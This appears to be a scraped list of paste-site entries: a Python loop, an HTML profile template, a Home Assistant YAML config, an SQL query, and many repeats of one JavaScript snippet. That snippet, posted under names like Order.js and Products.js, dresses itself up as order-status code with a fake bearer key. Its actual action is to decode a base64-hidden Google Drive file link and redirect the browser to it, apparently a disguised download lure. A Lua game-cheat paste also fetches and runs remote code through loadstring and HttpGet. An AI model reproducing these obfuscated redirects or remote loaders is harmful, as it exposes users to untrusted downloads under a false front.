  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CbeUbVtx,15 x и y,nq1s788,Python,Wednesday 16th of April 2025 09:48:37 AM CDT,"cnt = 0
for a in range(-100, 100):
    f = True
    for x in range(100):
        for y in range(100):
            if not (((x < 6) <= (x**2 < a)) and ((y**2 <= a) <= (y <= 6))):
                f = False
    if f:
        cnt += 1
print(cnt)"
2Q37QAKd,revamped lovecore,elltaker,HTML,Wednesday 16th of April 2025 09:46:42 AM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/Liebe_108.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/Liebe_108.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/%E3%83%8F%E3%83%94%E3%83%90_m.gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/%E3%83%8F%E3%83%94%E3%83%90_m.gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/%E3%83%8F%E3%83%94%E3%83%90_m.gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/zzpml.gif"" style=""height:20px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/heart.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
6CPF4jZz,Untitled,SpawnKz,JavaScript,Wednesday 16th of April 2025 09:40:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mZt00eTx,Products.js,SpawnKz,JavaScript,Wednesday 16th of April 2025 09:25:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06840/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EJPpyF7X,Order.js,SpawnKz,JavaScript,Wednesday 16th of April 2025 09:09:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84581/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1NyDrzDL,Market.js,SpawnKz,JavaScript,Wednesday 16th of April 2025 08:54:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15523/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UWxcRiP8,Untitled,SpawnKz,JavaScript,Wednesday 16th of April 2025 08:39:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88128/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RHw7S3q7,Products.js,Ratqueenkslskskwkw,JavaScript,Wednesday 16th of April 2025 08:23:37 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10356/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KdGrxNuK,Order.js,Ratqueenkslskskwkw,JavaScript,Wednesday 16th of April 2025 08:08:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77390/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SCdyn7YL,Market.js,Ratqueenkslskskwkw,JavaScript,Wednesday 16th of April 2025 07:52:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71355/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7DZ38Azk,TESP,Defender4262,Lua,Wednesday 16th of April 2025 07:44:33 AM CDT,"-- loadstring
local ESP = loadstring(game:HttpGet(""https://kiriot22.com/releases/ESP.lua""))()

-- config
ESP.Players = false
ESP.Boxes = false
ESP.Names = true
ESP:Toggle(true)

-- object
ESP:AddObjectListener(Workspace.Trash, { -- Object Path, For example: Workspace.ThisFolder
    Name = ""Meshes/cardboard_box001a"", --Object name inside of the path, for example: Workspace.ThisFolder.Item_1
    CustomName = ""Trash"", -- Name you want to be displayed
    Color = Color3.fromRGB(0, 0, 0), -- Color
    IsEnabled = ""whatever"" -- Any name, has to be the same as the last line: ESP.TheNameYouWant
})
ESP.whatever = true

ESP:AddObjectListener(Workspace.Trash, { -- Object Path, For example: Workspace.ThisFolder
    Name = ""Meshes/garbage256_composite002a"", --Object name inside of the path, for example: Workspace.ThisFolder.Item_1
    CustomName = ""Trash"", -- Name you want to be displayed
    Color = Color3.fromRGB(0, 0, 0), -- Color
    IsEnabled = ""whatever"" -- Any name, has to be the same as the last line: ESP.TheNameYouWant
})
ESP.whatever = true

ESP:AddObjectListener(Workspace.Trash, { -- Object Path, For example: Workspace.ThisFolder
    Name = ""Meshes/garbage256_composite002b"", --Object name inside of the path, for example: Workspace.ThisFolder.Item_1
    CustomName = ""Trash"", -- Name you want to be displayed
    Color = Color3.fromRGB(0, 0, 0), -- Color
    IsEnabled = ""whatever"" -- Any name, has to be the same as the last line: ESP.TheNameYouWant
})
ESP.whatever = true

ESP:AddObjectListener(Workspace.Trash, { -- Object Path, For example: Workspace.ThisFolder
    Name = ""Meshes/garbage_milkcarton002a"", --Object name inside of the path, for example: Workspace.ThisFolder.Item_1
    CustomName = ""Trash"", -- Name you want to be displayed
    Color = Color3.fromRGB(0, 0, 0), -- Color
    IsEnabled = ""whatever"" -- Any name, has to be the same as the last line: ESP.TheNameYouWant
})
ESP.whatever = true

ESP:AddObjectListener(Workspace.Trash, { -- Object Path, For example: Workspace.ThisFolder
    Name = ""Meshes/garbage_takeoutcarton001a"", --Object name inside of the path, for example: Workspace.ThisFolder.Item_1
    CustomName = ""Trash"", -- Name you want to be displayed
    Color = Color3.fromRGB(0, 0, 0), -- Color
    IsEnabled = ""whatever"" -- Any name, has to be the same as the last line: ESP.TheNameYouWant
})
ESP.whatever = true"
uRT4eWvc,Untitled,myakove,YAML,Wednesday 16th of April 2025 07:41:38 AM CDT,"# Global modules
Helpers:
  module: helpers
  class: Helpers

MediaPlayer:
  module: helpers
  class: MediaPlayer

AlarmHelper:
  module: helpers
  class: AlarmHelper

GoogleAssistantSDK:
  module: helpers
  class: GoogleAssistantSDK

Const:
  module: const
  class: Const

# Apps
Actions:
  module: actions
  class: Actions
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Alarm:
  module: alarm
  class: Alarm
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

BatteryStatus:
  module: battery_status
  class: BatteryStatus
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

PhoneBatteryStatus:
  module: battery_status
  class: PhoneBatteryStatus
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

WatchBatteryStatus:
  module: battery_status
  class: WatchBatteryStatus
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

LaptopBatteryStatus:
  module: battery_status
  class: LaptopBatteryStatus
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

GreeClimate:
  module: climate
  class: GreeClimate
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

ClimateLivingRoom:
  module: climate
  class: ClimateLivingRoom

GreeClimateParentRoom:
  module: climate
  class: GreeClimateParentRoom
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

GreeClimateAyalaRoom:
  module: climate
  class: GreeClimateAyalaRoom
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

GreeClimateLiatRoom:
  module: climate
  class: GreeClimateLiatRoom
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Entrance:
  module: entrance
  class: DoorSensorAlert
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Dummy:
  module: dummy
  class: Dummy
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

MotionSensorsLights:
  module: motion_sensors
  class: MotionSensorsLights
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

KitchenLedStrip:
  module: led_strips
  class: KitchenLedStrip
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

PalGate:
  module: palgate
  class: PalGate
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

PhoneState:
  module: phone_state
  class: PhoneState
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

PresenceDetection:
  module: presence_detection
  class: PresenceDetection
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

ShutterControlMeniRoom:
  module: shutter_control
  class: ShutterControlMeniRoom
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

FingerPrintReader:
  module: fingerprint_reader
  class: FingerPrintReader
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

TVMasterBedRoom:
  module: tv
  class: TVMasterBedRoom
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

WallSwitch:
  module: wall_switch
  class: WallSwitch
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

AppdaemonErrorNotify:
  module: appdaemon_error_notify
  class: AppdaemonErrorNotify
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

HomePresence:
  module: home_presence
  class: HomePresence
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

NFCTags:
  module: nfc_tags
  class: NFCTags
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

TasmotaIrLib:
  module: tasmota_ir_lib
  class: TasmotaIrLib
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Kettle:
  module: kettle
  class: Kettle
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

WasherMachine:
  module: washer_machine
  class: WasherMachine
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

DryderMachine:
  module: dryer_machine
  class: DryerMachine
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

AndroidPhoneControl:
  module: android_phone_control
  class: AndroidPhoneControl
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

CeilingFan:
  module: balcony
  class: CeilingFan
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

SpaceHeater:
  module: balcony
  class: SpaceHeater
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

BalconyShades:
  module: balcony
  class: Shades
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

AndroidTVTCL:
  module: android_tv
  class: AndroidTVTCL
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

AndroidTVLivingRoom:
  module: android_tv
  class: AndroidTVLivingRoom
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

AndroidTVParentRoom:
  module: android_tv
  class: AndroidTVParentRoom
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

MobileAppEventsCallbacks:
  module: mobile_app_events_callbacks
  class: MobileAppEventsCallbacks
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

UiSelectors:
  module: ui_selectors
  class: UiSelectors
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

TelegramClient:
  module: telegram_client
  class: TelegramClient
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Boiler:
  module: boiler
  class: Boiler
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

WebHooks:
  module: webhooks
  class: WebHooks
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

SmartPlugsPowerState:
  module: smart_plugs_power_state
  class: SmartPlugsPowerState
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

SmartPlugsPower:
  module: smart_plugs_power_state
  class: SmartPlugsPower
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Wled:
  module: wled
  class: Wled
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Vacuum:
  module: vacuum
  class: Vacuum
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

FullyKioskTablet:
  module: fully_kiosk_tablet
  class: FullyKioskTablet
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

DefaultDashboardTheme:
  module: default_dashboard_theme
  class: DefaultDashboardTheme
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Printer3D:
  module: 3d_printer
  class: Printer3D
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

ServersMonitor:
  module: servers_monitor
  class: ServersMonitor
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Knob1:
  module: knob
  class: Knob1
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Kitchen:
  module: kitchen
  class: Fridge
  dependencies:
    - Helpers
    - Const
    - MediaPlayer
    - AlarmHelper

Lights:
  module: lights
  class: Lights
  dependencies:
    - Const

IntegrationsUpdate:
  module: integrations_update
  class: IntegrationsUpdate
  dependencies:
    - Const

OrefAlerts:
  module: oref_alerts
  class: OrefAlerts
  dependencies:
    - Const
    - Helpers
    - MediaPlayer

StreamAssist:
  module: stream_assist
  class: StreamAssist

SnapraidStats:
  module: snapraid_stats
  class: SnapraidStats

WallSwitch4Way1LivingRoom:
  module: wall_switch_4way
  class: WallSwitch4Way1LivingRoom

WallSwitch4Way2AyalaRoom:
  module: wall_switch_4way
  class: WallSwitch4Way2AyalaRoom

WallSwitch4Way3LiatRoom:
  module: wall_switch_4way
  class: WallSwitch4Way3LiatRoom

WallSwitch4Way4MasterBathRoom:
  module: wall_switch_4way
  class: WallSwitch4Way4MasterBathRoom

WallSwitch4Way5ParentBathRoom:
  module: wall_switch_4way
  class: WallSwitch4Way5ParentBathRoom

WallSwitch4Way6ParentRoom:
  module: wall_switch_4way
  class: WallSwitch4Way6ParentRoom

RemoteConnect:
  module: remote_connect
  class: RemoteConnect

RoomsLedStrips:
  module: led_strips
  class: RoomsLedStrips

Conversations:
  module: conversations
  class: Conversations

Receiver:
  module: receiver
  class: Receiver"
ZaNyEbyt,Untitled,Ratqueenkslskskwkw,JavaScript,Wednesday 16th of April 2025 07:37:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60763/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7tWKqQKs,Products.js,Ratqueenkslskskwkw,JavaScript,Wednesday 16th of April 2025 07:22:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46072/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8rTYzNXt,CHANGEDAT,horozov86,SQL,Wednesday 16th of April 2025 07:12:21 AM CDT,"SELECT 
  TO_CHAR(afaktura.CREATEDAT, 'DD.MM.YYYY HH24:MI:SS') AS CREATEDAT,
  TO_CHAR(afaktura.CHANGEDAT, 'DD.MM.YYYY HH24:MI:SS') AS CHANGEDAT,
  afaktura.EXTFAKTURANR
FROM atour
LEFT JOIN atasend ON atour.nr = atasend.tournr
LEFT JOIN ASDGABRECHNUNG ON atasend.nr = ASDGABRECHNUNG.ATAID
LEFT JOIN afaktura ON ASDGABRECHNUNG.FK_IDAFAKTURA = afaktura.IDAFAKTURA
WHERE atour.TOURNUMMER = 496047;"
U9gXxPPw,Order.js,Ratqueenkslskskwkw,JavaScript,Wednesday 16th of April 2025 07:06:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21572/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
